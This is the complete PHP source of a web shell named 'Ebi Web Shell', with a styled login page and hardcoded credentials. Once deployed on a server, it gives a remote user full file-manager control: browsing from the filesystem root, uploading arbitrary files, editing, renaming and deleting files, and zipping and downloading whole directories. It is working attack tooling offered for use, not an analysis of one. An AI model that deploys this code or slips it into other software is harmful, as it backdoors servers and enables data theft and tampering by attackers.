<?php
session_start();

define('AUTH_USER', 'codebyebrahim');
define('AUTH_PASS', '123');

if (isset($_POST['auth'])) {
    $username = $_POST['user'] ?? '';
    $password = $_POST['pass'] ?? '';
    if ($username === AUTH_USER && $password === AUTH_PASS) {
        $_SESSION['authenticated'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $loginError = "Access Denied!";
    }
}

if (isset($_GET['exit'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['authenticated'])) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8" />
        <title>Ebi Webshell</title>
        <style>
    @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500&display=swap');

    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    body {
        background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
        color: #00d4ff;
        font-family: 'Fira Code', monospace;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        overflow: hidden;
    }

    body::before {
        content: '';
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: 
            radial-gradient(circle at 20% 20%, rgba(0, 212, 255, 0.1) 0%, transparent 50%),
            radial-gradient(circle at 80% 80%, rgba(255, 0, 150, 0.1) 0%, transparent 50%);
        pointer-events: none;
    }

    .access-panel {
        background: rgba(0, 0, 0, 0.9);
        backdrop-filter: blur(10px);
        border: 1px solid rgba(0, 212, 255, 0.3);
        border-radius: 12px;
        padding: 40px;
        width: 380px;
        box-shadow: 
            0 0 40px rgba(0, 212, 255, 0.2),
            inset 0 0 20px rgba(0, 212, 255, 0.05);
        position: relative;
        z-index: 1;
    }

    .access-panel::before {
        content: '';
        position: absolute;
        top: -2px;
        left: -2px;
        right: -2px;
        bottom: -2px;
        background: linear-gradient(45deg, #00d4ff, #ff0096, #00d4ff);
        border-radius: 12px;
        z-index: -1;
        animation: borderGlow 3s ease-in-out infinite;
    }

    @keyframes borderGlow {
        0%, 100% { opacity: 0.3; }
        50% { opacity: 0.8; }
    }

    .panel-header {
        text-align: center;
        margin-bottom: 30px;
    }

    .panel-header h2 {
        color: #00d4ff;
        font-size: 1.8rem;
        font-weight: 500;
        margin-bottom: 10px;
        text-shadow: 0 0 10px rgba(0, 212, 255, 0.5);
    }

    .panel-header .cursor {
        animation: blink 1s infinite;
    }

    @keyframes blink {
        0%, 50% { opacity: 1; }
        51%, 100% { opacity: 0; }
    }

    .panel-header .subtitle {
        color: #666;
        font-size: 0.9rem;
        letter-spacing: 1px;
    }

    .form-group {
        margin-bottom: 20px;
    }

    input[type="text"],
    input[type="password"] {
        width: 100%;
        padding: 15px;
        background: rgba(0, 0, 0, 0.8);
        border: 1px solid rgba(0, 212, 255, 0.3);
        border-radius: 8px;
        color: #00d4ff;
        font-family: 'Fira Code', monospace;
        font-size: 1rem;
        transition: all 0.3s ease;
    }

    input[type="text"]:focus,
    input[type="password"]:focus {
        outline: none;
        border-color: #00d4ff;
        box-shadow: 0 0 15px rgba(0, 212, 255, 0.3);
        background: rgba(0, 0, 0, 0.9);
    }

    .auth-btn {
        width: 100%;
        padding: 15px;
        background: linear-gradient(135deg, #00d4ff 0%, #0099cc 100%);
        border: none;
        border-radius: 8px;
        color: #000;
        font-family: 'Fira Code', monospace;
        font-size: 1rem;
        font-weight: 500;
        cursor: pointer;
        transition: all 0.3s ease;
        text-transform: uppercase;
        letter-spacing: 1px;
    }

    .auth-btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 10px 25px rgba(0, 212, 255, 0.4);
    }

    .error-msg {
        color: #ff3366;
        text-align: center;
        margin-top: 20px;
        font-size: 0.9rem;
        text-shadow: 0 0 5px rgba(255, 51, 102, 0.5);
    }
</style>
    </head>
    <body>
        <div class="access-panel">
            <div class="panel-header">
                <h2>SYSTEM ACCESS<span class="cursor">|</span></h2>
                <div class="subtitle">AUTHORIZED PERSONNEL ONLY</div>
            </div>
            <form method="post" action="">
                <div class="form-group">
                    <input type="text" name="user" placeholder="Username" required autofocus>
                </div>
                <div class="form-group">
                    <input type="password" name="pass" placeholder="Password" required>
                </div>
                <button type="submit" name="auth" class="auth-btn">Initialize Access</button>
                <?php if (!empty($loginError)) echo "<div class='error-msg'>$loginError</div>"; ?>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

$workingPath = isset($_POST['path']) && !empty($_POST['path']) ? base64_decode($_POST['path']) : getcwd();
$workingPath = str_replace("\\", "/", $workingPath);
$workingPath = rtrim($workingPath, '/');

function encodeData($data) {
    return base64_encode($data);
}

function decodeData($data) {
    return base64_decode($data);
}

// Directory download functionality
if (isset($_GET['get_dir'])) {
    $targetDir = isset($_GET['location']) ? base64_decode($_GET['location']) : $workingPath;
    $archiveName = "system_backup.zip";
    $archivePath = sys_get_temp_dir() . "/" . $archiveName;
    $archive = new ZipArchive();
    if ($archive->open($archivePath, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($targetDir, FilesystemIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iterator as $fileInfo) {
            $fullPath = $fileInfo->getRealPath();
            $relativePath = substr($fullPath, strlen($targetDir) + 1);
            if ($fileInfo->isDir()) {
                $archive->addEmptyDir($relativePath);
            } else {
                $archive->addFile($fullPath, $relativePath);
            }
        }
        $archive->close();
        header('Content-Type: application/zip');
        header("Content-Disposition: attachment; filename=$archiveName");
        header("Content-Length: " . filesize($archivePath));
        readfile($archivePath);
        unlink($archivePath);
        exit;
    } else {
        echo "<script>alert('Archive creation failed.');</script>";
    }
}

// File upload handler
if (isset($_POST['upload_file']) && isset($_FILES['file_data']) && $_FILES['file_data']['error'] == 0) {
    $uploadName = basename($_FILES['file_data']['name']);
    $tempFile = $_FILES['file_data']['tmp_name'];
    $targetPath = $workingPath . '/' . $uploadName;
    if (move_uploaded_file($tempFile, $targetPath)) {
        echo "<script>alert('File uploaded successfully!');</script>";
    } else {
        echo "<script>alert('Upload operation failed!');</script>";
    }
}

// File deletion handler
if (isset($_POST['remove_file']) && !empty($_POST['remove_file'])) {
    $targetFile = decodeData($_POST['remove_file']);
    $parentDir = dirname($targetFile);
    if (file_exists($targetFile) && is_writable($targetFile) && unlink($targetFile)) {
        echo "<script>alert('File removed successfully!');</script>";
        $workingPath = $parentDir;
    } else {
        echo "<script>alert('Removal failed or insufficient permissions!');</script>";
    }
}

// File rename handler
if (isset($_POST['rename_file']) && !empty($_POST['rename_file'])) {
    $originalPath = decodeData($_POST['rename_file']);
    $parentDir = dirname($originalPath);
    if (isset($_POST['new_name']) && !empty($_POST['new_name'])) {
        $newBaseName = basename($_POST['new_name']);
        $newFullPath = $parentDir . '/' . $newBaseName;
        if (file_exists($originalPath) && !file_exists($newFullPath) && rename($originalPath, $newFullPath)) {
            echo "<script>alert('File renamed successfully!');</script>";
            $workingPath = $parentDir;
        } else {
            echo "<script>alert('Rename operation failed!');</script>";
        }
    } else {
        // Display rename interface
        echo "<form method='post' style='margin:20px auto; width:350px; background:rgba(0,0,0,0.9); padding:25px; border-radius:10px; border:1px solid #00d4ff; box-shadow:0 0 20px rgba(0,212,255,0.3);'>"
            . "<h3 style='color:#00d4ff; margin-bottom:15px; text-align:center;'>Rename File</h3>"
            . "<input name='new_name' type='text' placeholder='Enter new filename' style='width:100%; padding:10px; background:#111; color:#00d4ff; border:1px solid #00d4ff; border-radius:5px; margin-bottom:15px;'><br>"
            . "<input type='hidden' name='rename_file' value='" . htmlspecialchars($_POST['rename_file']) . "'>"
            . "<input type='hidden' name='path' value='" . encodeData($parentDir) . "'>"
            . "<button type='submit' style='width:100%; padding:12px; background:#00d4ff; border:none; color:#000; border-radius:5px; cursor:pointer; font-weight:bold;'>Execute Rename</button>"
            . "</form>";
        exit;
    }
}

// File editor interface
if (isset($_POST['edit_file']) && !empty($_POST['edit_file'])) {
    $editTarget = decodeData($_POST['edit_file']);
    $parentDir = dirname($editTarget);
    if (file_exists($editTarget) && is_writable($editTarget)) {
        echo "<style>table{display:none;} body { background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%); color: #00d4ff; font-family: 'Fira Code', monospace; }</style>"
            . "<script>
                function navigateToDir(directory) {
                    const form = document.createElement('form');
                    form.method = 'post';
                    form.action = '';
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = 'path';
                    input.value = btoa(directory);
                    form.appendChild(input);
                    document.body.appendChild(form);
                    form.submit();
                }
               </script>"
            . "<a href='javascript:void(0);' onclick='navigateToDir(\"" . addslashes($parentDir) . "\")' 
                style='margin:15px; display:inline-block; padding:10px 20px; background:rgba(0,0,0,0.9); color:#00d4ff; border:1px solid #00d4ff; border-radius:6px; text-decoration:none;'>← Return</a>"
            . "<form method='post' style='margin:20px auto; width:95%; max-width:900px; background:rgba(0,0,0,0.9); padding:25px; border-radius:10px; border:1px solid #00d4ff; box-shadow:0 0 25px rgba(0,212,255,0.2);'>"
            . "<h3 style='color:#00d4ff; margin-bottom:15px; text-align:center;'>Editing: " . htmlspecialchars(basename($editTarget)) . "</h3>"
            . "<textarea name='file_content' style='width:100%; height:500px; background:#111; color:#00d4ff; border:1px solid #00d4ff; border-radius:6px; font-family: \"Fira Code\", monospace; padding:15px; resize:vertical;'>"
            . htmlspecialchars(file_get_contents($editTarget))
            . "</textarea><br><br>"
            . "<input type='hidden' name='target_file' value='" . htmlspecialchars($_POST['edit_file']) . "'>"
            . "<input type='hidden' name='path' value='" . encodeData($parentDir) . "'>"
            . "<button type='submit' name='save_changes' value='1' style='width:100%; padding:15px; background:#00d4ff; border:none; color:#000; border-radius:6px; cursor:pointer; font-weight:bold; font-size:1.1rem;'>💾 Save Changes</button>"
            . "</form>";
    } else {
        echo "<script>alert('File is not writable or does not exist!');</script>";
    }
    exit;
}

// Save file changes
if (isset($_POST['save_changes']) && isset($_POST['target_file']) && isset($_POST['file_content'])) {
    $saveTarget = decodeData($_POST['target_file']);
    $parentDir = dirname($saveTarget);
    if (file_exists($saveTarget) && is_writable($saveTarget)) {
        file_put_contents($saveTarget, $_POST['file_content']);
        echo "<script>alert('Changes saved successfully!');</script>";
        $workingPath = $parentDir;
    } else {
        echo "<script>alert('Save failed or insufficient permissions!');</script>";
    }
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Ebi webshell</title>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500&display=swap');
    
    body {
        background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
        color: #00d4ff;
        font-family: 'Fira Code', monospace;
        margin: 0; 
        padding: 25px;
        min-height: 100vh;
    }

    body::before {
        content: '';
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: 
            radial-gradient(circle at 20% 20%, rgba(0, 212, 255, 0.05) 0%, transparent 50%),
            radial-gradient(circle at 80% 80%, rgba(255, 0, 150, 0.05) 0%, transparent 50%);
        pointer-events: none;
        z-index: -1;
    }

    .header-section {
        text-align: center;
        margin-bottom: 30px;
        padding: 20px;
        background: rgba(0, 0, 0, 0.6);
        border-radius: 10px;
        border: 1px solid rgba(0, 212, 255, 0.3);
    }

    .header-section h2 {
        color: #00d4ff;
        font-size: 2rem;
        margin-bottom: 10px;
        text-shadow: 0 0 15px rgba(0, 212, 255, 0.5);
    }

    .control-bar {
        text-align: right;
        margin-bottom: 20px;
        padding: 15px;
        background: rgba(0, 0, 0, 0.4);
        border-radius: 8px;
        border: 1px solid rgba(0, 212, 255, 0.2);
    }

    .control-bar a, .download-btn {
        color: #00d4ff;
        text-decoration: none;
        padding: 8px 16px;
        border: 1px solid #00d4ff;
        border-radius: 6px;
        margin-left: 10px;
        transition: all 0.3s ease;
        background: rgba(0, 0, 0, 0.6);
    }

    .control-bar a:hover, .download-btn:hover {
        background: rgba(0, 212, 255, 0.1);
        box-shadow: 0 0 10px rgba(0, 212, 255, 0.3);
    }

    .path-nav {
        background: rgba(0, 0, 0, 0.6);
        padding: 15px;
        border-radius: 8px;
        margin-bottom: 20px;
        border: 1px solid rgba(0, 212, 255, 0.3);
    }

    .path-nav a {
        color: #00d4ff;
        text-decoration: none;
        transition: all 0.3s ease;
    }

    .path-nav a:hover {
        color: #fff;
        text-shadow: 0 0 5px rgba(0, 212, 255, 0.7);
    }

    .upload-section {
        text-align: center;
        margin-bottom: 25px;
        padding: 20px;
        background: rgba(0, 0, 0, 0.4);
        border-radius: 8px;
        border: 1px solid rgba(0, 212, 255, 0.2);
    }

    .upload-section input[type=file], .upload-section button {
        background: rgba(0, 0, 0, 0.8);
        color: #00d4ff;
        border: 1px solid #00d4ff;
        padding: 10px;
        margin: 8px;
        border-radius: 6px;
        transition: all 0.3s ease;
    }

    .upload-section button:hover {
        background: rgba(0, 212, 255, 0.1);
        box-shadow: 0 0 10px rgba(0, 212, 255, 0.3);
    }

    .file-table {
        width: 100%;
        margin-top: 20px;
        border-collapse: collapse;
        background: rgba(0, 0, 0, 0.6);
        border-radius: 10px;
        overflow: hidden;
        box-shadow: 0 0 20px rgba(0, 212, 255, 0.1);
    }

    .file-table th, .file-table td {
        border: 1px solid rgba(0, 212, 255, 0.3);
        padding: 12px;
        text-align: left;
    }

    .file-table th {
        background: rgba(0, 212, 255, 0.1);
        color: #00d4ff;
        font-weight: 500;
    }

    .file-table tr:hover {
        background: rgba(0, 212, 255, 0.05);
    }

    .action-btn {
        color: #00d4ff;
        background: rgba(0, 0, 0, 0.8);
        border: 1px solid #00d4ff;
        padding: 6px 12px;
        margin-right: 5px;
        border-radius: 4px;
        text-decoration: none;
        font-size: 0.9rem;
        transition: all 0.3s ease;
    }

    .action-btn:hover {
        background: rgba(0, 212, 255, 0.1);
        box-shadow: 0 0 8px rgba(0, 212, 255, 0.3);
    }

    .footer-info {
        text-align: center;
        margin-top: 40px;
        color: rgba(0, 212, 255, 0.7);
        font-size: 0.9rem;
    }

    @keyframes pulse {
        0%, 100% { opacity: 0.7; }
        50% { opacity: 1; }
    }

    .cursor {
        animation: pulse 1s infinite;
    }
</style>
<script>
function navigateToDir(directory) {
    var form = document.createElement('form');
    form.method = 'post';
    form.action = '';
    var input = document.createElement('input');
    input.type = 'hidden';
    input.name = 'path';
    input.value = btoa(directory);
    form.appendChild(input);
    document.body.appendChild(form);
    form.submit();
}
function confirmDelete(filePath) {
    if (confirm('Are you sure you want to delete this file?')) {
        var form = document.createElement('form');
        form.method = 'post';
        form.action = '';
        var input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'remove_file';
        input.value = btoa(filePath);
        form.appendChild(input);
        document.body.appendChild(form);
        form.submit();
    }
}
function editFile(filePath) {
    var form = document.createElement('form');
    form.method = 'post';
    form.action = '';
    var input = document.createElement('input');
    input.type = 'hidden';
    input.name = 'edit_file';
    input.value = btoa(filePath);
    form.appendChild(input);
    document.body.appendChild(form);
    form.submit();
}
function renameFile(filePath, currentName) {
    var newName = prompt('Enter new filename:', currentName);
    if (newName && newName !== currentName) {
        var form = document.createElement('form');
        form.method = 'post';
        form.action = '';
        var input1 = document.createElement('input');
        input1.type = 'hidden';
        input1.name = 'rename_file';
        input1.value = btoa(filePath);
        var input2 = document.createElement('input');
        input2.type = 'hidden';
        input2.name = 'new_name';
        input2.value = newName;
        form.appendChild(input1);
        form.appendChild(input2);
        document.body.appendChild(form);
        form.submit();
    }
}
</script>
</head>
<body>
<div class="header-section">
    <h2>Ebi Web Shell <span class="cursor">█</span></h2>
</div>

<div class="control-bar">
    Active User: <b><?php echo AUTH_USER; ?></b> |
    <a href="?exit=1">Terminate Session</a>
    <a class="download-btn" href="?get_dir=1&location=<?php echo urlencode(encodeData($workingPath)); ?>">Download Current Directory</a>
</div>

<div class="path-nav">
    Current Path:
    <?php
    $pathSegments = explode('/', $workingPath);
    $buildPath = '';
    echo "<a href=\"javascript:void(0);\" onclick=\"navigateToDir('/')\">/</a>";
    foreach ($pathSegments as $segment) {
        if ($segment === '') continue;
        $buildPath .= '/' . $segment;
        echo " / <a href=\"javascript:void(0);\" onclick=\"navigateToDir('" . addslashes($buildPath) . "')\">" . htmlspecialchars($segment) . "</a>";
    }
    ?>
</div>

<div class="upload-section">
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="file_data" required>
        <input type="hidden" name="path" value="<?php echo encodeData($workingPath); ?>">
        <input type="hidden" name="upload_file" value="1">
        <button type="submit">Upload File</button>
    </form>
</div>

<table class="file-table">
    <tr><th>Name</th><th>Size</th><th>Modified</th><th>Actions</th></tr>
    <?php
    if (is_dir($workingPath) && $dirHandle = opendir($workingPath)) {
        $fileList = [];
        while (($item = readdir($dirHandle)) !== false) {
            if ($item === '.') continue;
            if ($item === '..') {
                $parentPath = dirname($workingPath);
                echo "<tr><td colspan='4'><a href=\"javascript:void(0);\" onclick=\"navigateToDir('" . addslashes($parentPath) . "')\">🔙 Parent Directory</a></td></tr>";
                continue;
            }
            $fullItemPath = $workingPath . '/' . $item;
            $isDirectory = is_dir($fullItemPath);
            $itemSize = $isDirectory ? '-' : filesize($fullItemPath);
            $lastModified = date('Y-m-d H:i:s', filemtime($fullItemPath));
            $fileList[] = ['name'=>$item, 'path'=>$fullItemPath, 'is_dir'=>$isDirectory, 'size'=>$itemSize, 'modified'=>$lastModified];
        }
        closedir($dirHandle);

        // Sort directories first, then files
        usort($fileList, function($a, $b) {
            if ($a['is_dir'] == $b['is_dir']) return strcasecmp($a['name'], $b['name']);
            return $a['is_dir'] ? -1 : 1;
        });

        foreach ($fileList as $fileInfo) {
            $displayName = htmlspecialchars($fileInfo['name']);
            $encodedPath = htmlspecialchars($fileInfo['path']);
            if ($fileInfo['is_dir']) {
                echo "<tr><td><a href=\"javascript:void(0);\" onclick=\"navigateToDir('" . addslashes($fileInfo['path']) . "')\">📁 $displayName</a></td><td>-</td><td>{$fileInfo['modified']}</td><td></td></tr>";
            } else {
                $sizeDisplay = ($fileInfo['size'] > 1024 * 1024)
                    ? round($fileInfo['size'] / (1024*1024), 2) . " MB"
                    : (($fileInfo['size'] > 1024) ? round($fileInfo['size'] / 1024, 2) . " KB" : $fileInfo['size'] . " B");

                $downloadFile = basename($encodedPath);

                echo "<tr><td><a href=\"$downloadFile\" download>$displayName</a></td><td>$sizeDisplay</td><td>{$fileInfo['modified']}</td>"
                . "<td>"
                . "<a href=\"javascript:void(0);\" class=\"action-btn\" onclick=\"editFile('{$encodedPath}')\">Edit</a>"
                . "<a href=\"javascript:void(0);\" class=\"action-btn\" onclick=\"renameFile('{$encodedPath}', '$displayName')\">Rename</a>"
                . "<a href=\"javascript:void(0);\" class=\"action-btn\" onclick=\"confirmDelete('{$encodedPath}')\">Delete</a>"
                . "</td></tr>";
            }
        }
    } else {
        echo "<tr><td colspan='4'>Unable to access directory or insufficient permissions.</td></tr>";
    }
    ?>
</table>

<div class="footer-info">
    CodeByEbrahim
</div>
</body>
</html>
